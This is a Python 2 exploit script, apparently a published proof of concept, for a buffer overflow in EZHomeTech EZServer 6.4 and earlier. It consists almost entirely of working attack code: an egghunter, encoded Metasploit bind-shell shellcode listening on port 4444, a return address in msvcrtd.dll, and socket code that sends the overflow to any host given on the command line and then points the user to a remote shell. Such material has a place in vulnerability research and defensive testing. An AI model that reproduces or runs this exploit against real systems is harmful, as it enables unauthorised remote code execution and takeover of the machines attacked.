#!/usr/bin/python

from socket import *
import sys,struct,os,time

print "\n[*] EZHomeTech EZServer <= 6.4 Buffer Overflow"
print "[*] bug found by modpr0be[at]spentera | @modpr0be\n"

if len(sys.argv) != 3:
    print "[*] Usage: python %s <ip> <port>\n" %sys.argv[0]
    sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])

hunt = (
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A"
"\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
"\xEF\xB8\x77\x30\x30\x74\x8B\xFA"
"\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

#windows/shell_bind_tcp - 751 bytes
#http://www.metasploit.com
#Encoder: x86/alpha_upper
#AutoRunScript=, VERBOSE=false, EXITFUNC=process, LPORT=4444, 

shellcode = ("\x89\xe5\xda\xcf\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49\x49\x43"
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4c\x49\x45\x50"
"\x35\x50\x53\x30\x35\x30\x4b\x39\x4a\x45\x36\x51\x38\x52\x33"
"\x54\x4c\x4b\x50\x52\x56\x50\x4c\x4b\x46\x32\x44\x4c\x4c\x4b"
"\x30\x52\x45\x44\x4c\x4b\x33\x42\x37\x58\x44\x4f\x38\x37\x51"
"\x5a\x57\x56\x50\x31\x4b\x4f\x36\x51\x4f\x30\x4e\x4c\x47\x4c"
"\x53\x51\x43\x4c\x34\x42\x46\x4c\x37\x50\x49\x51\x38\x4f\x54"
"\x4d\x53\x31\x38\x47\x4a\x42\x4a\x50\x36\x32\x56\x37\x4c\x4b"
"\x56\x32\x44\x50\x4c\x4b\x37\x32\x37\x4c\x43\x31\x38\x50\x4c"
"\x4b\x37\x30\x33\x48\x4b\x35\x59\x50\x54\x34\x31\x5a\x33\x31"
"\x4e\x30\x36\x30\x4c\x4b\x30\x48\x52\x38\x4c\x4b\x56\x38\x57"
"\x50\x53\x31\x4e\x33\x4a\x43\x57\x4c\x30\x49\x4c\x4b\x50\x34"
"\x4c\x4b\x53\x31\x39\x46\x50\x31\x4b\x4f\x36\x51\x59\x50\x4e"
"\x4c\x59\x51\x48\x4f\x34\x4d\x45\x51\x59\x57\x50\x38\x4b\x50"
"\x53\x45\x5a\x54\x33\x33\x53\x4d\x4b\x48\x47\x4b\x33\x4d\x31"
"\x34\x42\x55\x4a\x42\x46\x38\x4c\x4b\x36\x38\x31\x34\x45\x51"
"\x38\x53\x55\x36\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x58\x35"
"\x4c\x43\x31\x59\x43\x4c\x4b\x34\x44\x4c\x4b\x35\x51\x48\x50"
"\x4c\x49\x31\x54\x31\x34\x57\x54\x51\x4b\x31\x4b\x55\x31\x56"
"\x39\x30\x5a\x50\x51\x4b\x4f\x4d\x30\x31\x48\x31\x4f\x30\x5a"
"\x4c\x4b\x54\x52\x5a\x4b\x4d\x56\x51\x4d\x33\x58\x37\x43\x47"
"\x42\x45\x50\x53\x30\x43\x58\x34\x37\x53\x43\x46\x52\x31\x4f"
"\x50\x54\x52\x48\x30\x4c\x54\x37\x46\x46\x53\x37\x4b\x4f\x39"
"\x45\x58\x38\x4c\x50\x55\x51\x43\x30\x45\x50\x37\x59\x58\x44"
"\x46\x34\x56\x30\x53\x58\x31\x39\x4d\x50\x32\x4b\x45\x50\x4b"
"\x4f\x58\x55\x36\x30\x56\x30\x56\x30\x46\x30\x47\x30\x46\x30"
"\x31\x50\x46\x30\x55\x38\x4a\x4a\x44\x4f\x39\x4f\x4b\x50\x4b"
"\x4f\x48\x55\x4d\x59\x59\x57\x50\x31\x59\x4b\x30\x53\x55\x38"
"\x55\x52\x35\x50\x52\x31\x51\x4c\x4b\x39\x4a\x46\x32\x4a\x32"
"\x30\x31\x46\x50\x57\x35\x38\x49\x52\x59\x4b\x56\x57\x53\x57"
"\x4b\x4f\x39\x45\x30\x53\x51\x47\x52\x48\x4e\x57\x4d\x39\x37"
"\x48\x4b\x4f\x4b\x4f\x49\x45\x51\x43\x50\x53\x30\x57\x35\x38"
"\x44\x34\x5a\x4c\x47\x4b\x4b\x51\x4b\x4f\x49\x45\x56\x37\x4c"
"\x49\x58\x47\x43\x58\x34\x35\x42\x4e\x50\x4d\x53\x51\x4b\x4f"
"\x58\x55\x55\x38\x43\x53\x52\x4d\x33\x54\x55\x50\x4c\x49\x4b"
"\x53\x51\x47\x46\x37\x31\x47\x36\x51\x4c\x36\x33\x5a\x42\x32"
"\x31\x49\x46\x36\x5a\x42\x4b\x4d\x45\x36\x48\x47\x47\x34\x31"
"\x34\x37\x4c\x55\x51\x33\x31\x4c\x4d\x30\x44\x47\x54\x44\x50"
"\x48\x46\x35\x50\x30\x44\x30\x54\x30\x50\x46\x36\x51\x46\x56"
"\x36\x37\x36\x46\x36\x30\x4e\x31\x46\x51\x46\x51\x43\x31\x46"
"\x32\x48\x52\x59\x48\x4c\x57\x4f\x4b\x36\x4b\x4f\x38\x55\x4d"
"\x59\x4d\x30\x50\x4e\x56\x36\x51\x56\x4b\x4f\x36\x50\x43\x58"
"\x54\x48\x4c\x47\x55\x4d\x33\x50\x4b\x4f\x4e\x35\x4f\x4b\x4a"
"\x50\x58\x35\x4f\x52\x36\x36\x53\x58\x49\x36\x4d\x45\x4f\x4d"
"\x4d\x4d\x4b\x4f\x58\x55\x47\x4c\x43\x36\x53\x4c\x35\x5a\x4d"
"\x50\x4b\x4b\x4d\x30\x54\x35\x55\x55\x4f\x4b\x57\x37\x35\x43"
"\x32\x52\x52\x4f\x43\x5a\x45\x50\x51\x43\x4b\x4f\x4e\x35\x41"
"\x41")

memory = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
"\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
"\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
"\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
"\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
"\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
"\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
"\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shikata = ("\xbe\xda\xa4\x69\xe6\xdb\xd1\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x56\x31\x70\x13\x83\xc0\x04\x03\x70\xd5\x46\x9c\x1a\x01\x0f"
"\x5f\xe3\xd1\x70\xe9\x06\xe0\xa2\x8d\x43\x50\x73\xc5\x06\x58"
"\xf8\x8b\xb2\xeb\x8c\x03\xb4\x5c\x3a\x72\xfb\x5d\x8a\xba\x57"
"\x9d\x8c\x46\xaa\xf1\x6e\x76\x65\x04\x6e\xbf\x98\xe6\x22\x68"
"\xd6\x54\xd3\x1d\xaa\x64\xd2\xf1\xa0\xd4\xac\x74\x76\xa0\x06"
"\x76\xa7\x18\x1c\x30\x5f\x13\x7a\xe1\x5e\xf0\x98\xdd\x29\x7d"
"\x6a\x95\xab\x57\xa2\x56\x9a\x97\x69\x69\x12\x1a\x73\xad\x95"
"\xc4\x06\xc5\xe5\x79\x11\x1e\x97\xa5\x94\x83\x3f\x2e\x0e\x60"
"\xc1\xe3\xc9\xe3\xcd\x48\x9d\xac\xd1\x4f\x72\xc7\xee\xc4\x75"
"\x08\x67\x9e\x51\x8c\x23\x45\xfb\x95\x89\x28\x04\xc5\x76\x95"
"\xa0\x8d\x95\xc2\xd3\xcf\xf1\x27\xee\xef\x01\x2f\x79\x83\x33"
"\xf0\xd1\x0b\x78\x79\xfc\xcc\x7f\x50\xb8\x43\x7e\x5a\xb9\x4a"
"\x45\x0e\xe9\xe4\x6c\x2e\x62\xf5\x91\xfb\x25\xa5\x3d\x53\x86"
"\x15\xfe\x03\x6e\x7c\xf1\x7c\x8e\x7f\xdb\x0b\x88\xb1\x3f\x58"
"\x7f\xb0\xbf\x4f\x23\x3d\x59\x05\xcb\x6b\xf1\xb1\x29\x48\xca"
"\x26\x51\xba\x66\xff\xc5\xf2\x60\xc7\xea\x02\xa7\x64\x46\xaa"
"\x20\xfe\x84\x6f\x50\x01\x81\xc7\x1b\x3a\x42\x9d\x75\x89\xf2"
"\xa2\x5f\x79\x96\x31\x04\x79\xd1\x29\x93\x2e\xb6\x9c\xea\xba"
"\x2a\x86\x44\xd8\xb6\x5e\xae\x58\x6d\xa3\x31\x61\xe0\x9f\x15"
"\x71\x3c\x1f\x12\x25\x90\x76\xcc\x93\x56\x21\xbe\x4d\x01\x9e"
"\x68\x19\xd4\xec\xaa\x5f\xd9\x38\x5d\xbf\x68\x95\x18\xc0\x45"
"\x71\xad\xb9\xbb\xe1\x52\x10\x78\x11\x19\x38\x29\xba\xc4\xa9"
"\x6b\xa7\xf6\x04\xaf\xde\x74\xac\x50\x25\x64\xc5\x55\x61\x22"
"\x36\x24\xfa\xc7\x38\x9b\xfb\xcd")

buffer = "\x41" * 5408
buffer+= "w00tw00t"
buffer+= shikata
buffer+= "\x90" * 100
buffer+= "\xeb\x08\x90\x90"
buffer+= struct.pack('<L', 0x10212779)	#0x10212779 msvcrtd.dll
buffer+= "\x90" * 16
buffer+= hunt
buffer+= "D" * (10000 - len(buffer))

print "[!] Connecting to %s on port %d" % (host,port)
s = socket(AF_INET, SOCK_STREAM)

try:
	s.connect((host,port))
	print "[+] Launching attack.."
	s.send (buffer)
	s.close()
	time.sleep(1)
	print "[+] Telnet to port 4444 get a shell on %s\n" %host
except:
	print "[x] Could not connect to the server x_x"
	sys.exit()
